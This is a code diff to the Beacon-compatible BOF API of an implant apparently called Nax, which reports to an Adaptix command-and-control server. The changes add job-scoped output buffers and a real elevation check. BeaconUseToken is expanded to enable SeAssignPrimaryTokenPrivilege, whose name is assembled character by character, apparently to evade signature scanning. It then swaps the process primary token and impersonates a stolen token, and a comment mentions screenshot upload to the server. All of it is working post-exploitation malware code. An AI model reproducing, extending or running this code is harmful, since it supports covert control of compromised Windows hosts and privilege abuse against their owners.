@@ -3,8 +3,8 @@
  * BeaconPrintf, BeaconIsAdmin, BeaconFormat*.
  *
  * All functions use G_INSTANCE to access NAX_INSTANCE via TEB ArbitraryUserPointer.
- * BeaconOutput accumulates output in NAX_INSTANCE.BofCtx.Buf (heap, BOF-lifetime only).
- * BeaconFormatAlloc allocates from the beacon heap; caller must call BeaconFormatFree. */
+ * BeaconOutput routes to job->BofCtx (under lock) for async BOFs, or Nax->BofCtx
+ * for sync BOFs. BeaconFormatAlloc allocates from beacon heap; caller must free. */
 
 /* included by Loader.c (unity build) - headers already in scope */
 #ifndef _NAX_BOF_UNITY_BUILD_
@@ -20,8 +20,20 @@ FUNC VOID BeaconOutput( INT type, const CHAR* data, INT len ) {
     G_INSTANCE;
     if ( !Nax || len <= 0 || !data ) return;
 
-    NAX_BOF_CTX* ctx = &Nax->BofCtx;
-    if ( !ctx->Buf ) return;
+    NAX_JOB* job = NaxFindCurrentJob( Nax );
+    NAX_BOF_CTX* ctx;
+
+    if ( job ) {
+        Nax->Ntdll.RtlEnterCriticalSection( &job->Lock );
+        ctx = &job->BofCtx;
+    } else {
+        ctx = &Nax->BofCtx;
+    }
+
+    if ( !ctx->Buf ) {
+        if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
+        return;
+    }
 
     /* Adaptix sends each BeaconOutput call as a separate message.  We
      * concatenate into one buffer, so insert '\n' between consecutive
@@ -33,12 +45,17 @@ FUNC VOID BeaconOutput( INT type, const CHAR* data, INT len ) {
 
     /* leave 1 byte for null terminator */
     UINT32 space = ( ctx->Cap > ctx->Len + 1u ) ? ( ctx->Cap - ctx->Len - 1u ) : 0;
-    if ( space == 0 ) return;
+    if ( space == 0 ) {
+        if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
+        return;
+    }
 
     UINT32 copy = ( (UINT32)len <= space ) ? (UINT32)len : space;
     MmCopy( ctx->Buf + ctx->Len, (PVOID)data, copy );
     ctx->Len        += copy;
     ctx->Buf[ctx->Len] = '\0';
+
+    if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
 }
 
 FUNC VOID BeaconPrintf( INT type, const CHAR* fmt, ... ) {
@@ -117,19 +134,88 @@ FUNC CHAR* BeaconDataExtract( datap* parser, INT* size ) {
 /* ========= [ utility ] ========= */
 
 FUNC BOOL BeaconIsAdmin( VOID ) {
-    return FALSE;   /* Phase 7A stub */
+    G_INSTANCE;
+    if ( !Nax ) return FALSE;
+
+    HANDLE hToken = NULL;
+    if ( Nax->Advapi32.OpenThreadToken )
+        Nax->Advapi32.OpenThreadToken( (HANDLE)(LONG_PTR)-2, TOKEN_QUERY, TRUE, &hToken );
+    if ( !hToken )
+        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken );
+    if ( !hToken ) return FALSE;
+
+    struct { DWORD TokenIsElevated; } elev = {0};
+    DWORD elevSize = 0;
+    BOOL elevated = FALSE;
+    if ( Nax->Advapi32.GetTokenInformation &&
+         Nax->Advapi32.GetTokenInformation( hToken, (TOKEN_INFORMATION_CLASS)20, &elev, sizeof( elev ), &elevSize ) )
+        elevated = ( elev.TokenIsElevated != 0 );
+
+    Nax->Ntdll.NtClose( hToken );
+    return elevated;
 }
 
 FUNC BOOL BeaconUseToken( HANDLE token ) {
     G_INSTANCE;
-    if ( !Nax || !Nax->Advapi32.ImpersonateLoggedOnUser ) return FALSE;
-    return Nax->Advapi32.ImpersonateLoggedOnUser( token );
+    if ( !Nax || !token ) return FALSE;
+
+    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
+        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
+
+    /* Enable SeAssignPrimaryTokenPrivilege */
+    if ( Nax->Advapi32.LookupPrivilegeValueA && Nax->Advapi32.AdjustTokenPrivileges ) {
+        HANDLE hProcToken = NULL;
+        if ( NT_SUCCESS( Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcToken ) ) && hProcToken ) {
+            CHAR pn[30];
+            pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
+            pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
+            pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
+            pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
+            LUID luid;
+            MmZero( &luid, sizeof( luid ) );
+            if ( Nax->Advapi32.LookupPrivilegeValueA( NULL, pn, &luid ) ) {
+                TOKEN_PRIVILEGES tp;
+                tp.PrivilegeCount           = 1;
+                tp.Privileges[0].Luid       = luid;
+                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                Nax->Advapi32.AdjustTokenPrivileges( hProcToken, FALSE, &tp, 0, NULL, NULL );
+            }
+            Nax->Ntdll.NtClose( hProcToken );
+        }
+    }
+
+    /* Swap process primary token */
+    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
+        HANDLE hPrimary = NULL;
+        if ( Nax->Advapi32.DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
+            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
+            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+            Nax->Ntdll.NtClose( hPrimary );
+        }
+    }
+
+    if ( Nax->Advapi32.ImpersonateLoggedOnUser )
+        Nax->Advapi32.ImpersonateLoggedOnUser( token );
+
+    Nax->ActiveToken = token;
+    return TRUE;
 }
 
 FUNC VOID BeaconRevertToken( VOID ) {
     G_INSTANCE;
-    if ( Nax && Nax->Advapi32.RevertToSelf )
+    if ( !Nax ) return;
+
+    if ( Nax->Advapi32.RevertToSelf )
         Nax->Advapi32.RevertToSelf();
+
+    if ( Nax->OriginalPrimaryToken && Nax->Ntdll.NtSetInformationProcess ) {
+        struct { HANDLE Token; HANDLE Thread; } pat = { Nax->OriginalPrimaryToken, NULL };
+        Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+        Nax->Ntdll.NtClose( Nax->OriginalPrimaryToken );
+        Nax->OriginalPrimaryToken = NULL;
+    }
+
+    Nax->ActiveToken = NULL;
 }
 
 FUNC VOID BeaconGetSpawnTo( BOOL x86, CHAR* buffer, INT length ) {
@@ -222,8 +308,17 @@ static VOID AxBofMediaAppend( PNAX_INSTANCE Nax, PBYTE data, UINT32 len ) {
     if ( !node ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, data ); return; }
     node->Data = data;
     node->Len  = len;
-    node->Next = Nax->BofCtx.MediaHead;
-    Nax->BofCtx.MediaHead = node;
+
+    NAX_JOB* job = NaxFindCurrentJob( Nax );
+    if ( job ) {
+        Nax->Ntdll.RtlEnterCriticalSection( &job->Lock );
+        node->Next = job->BofCtx.MediaHead;
+        job->BofCtx.MediaHead = node;
+        Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
+    } else {
+        node->Next = Nax->BofCtx.MediaHead;
+        Nax->BofCtx.MediaHead = node;
+    }
 }
 
 /* AxAddScreenshot - sends a screenshot image back to the Adaptix server.
@@ -284,8 +379,10 @@ FUNC VOID BeaconWakeup( VOID ) {
 
 FUNC HANDLE BeaconGetStopJobEvent( VOID ) {
     G_INSTANCE;
-    if ( !Nax || !Nax->CurrentJob ) return NULL;
-    return Nax->CurrentJob->hStopEvent;
+    if ( !Nax ) return NULL;
+    NAX_JOB* job = NaxFindCurrentJob( Nax );
+    if ( !job ) return NULL;
+    return job->hStopEvent;
 }
 
 /* ========= [ format buffer ] ========= */
